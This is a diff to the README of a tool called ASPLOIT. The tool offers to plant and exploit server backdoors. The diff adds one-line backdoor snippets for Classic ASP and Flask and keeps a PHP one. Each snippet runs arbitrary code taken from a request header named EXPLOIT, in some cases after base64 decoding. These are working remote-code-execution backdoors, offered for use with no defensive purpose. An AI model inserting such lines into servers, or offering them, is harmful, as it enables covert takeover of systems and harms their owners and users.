@@ -1,9 +1,19 @@
 # ASPLOIT
-This tool allows you to deploy and exploit backdoors with one line of code in Node and PHP servers.
+This tool allows you to deploy and exploit backdoors with one line of code in Classic ASP, Flask, NodeJS, and PHP servers.
 
 # Backdoor
+## Classic ASP
+Add the following line to the top of the file you want to have the backdoor
+```
+<% If request.servervariables("EXPLOIT") <> "" Then:execute(request.servervariables("EXPLOIT")):response.end:End If %>
+```
+## Flask
+Add the following line to the top of the endpoint you want to have the backdoor
+```
+if request.headers.get('EXPLOIT'): global r;exec(__import__('base64').b64decode(request.headers.get('EXPLOIT').encode()).decode());return r;
+```
 ## PHP
-Add the following line of PHP to the top of the endpoint you want to have the backdoor
+Add the following line to the top of the endpoint you want to have the backdoor
 ```
 isset($_SERVER["HTTP_EXPLOIT"]) and eval($_SERVER["HTTP_EXPLOIT"]);
 ```
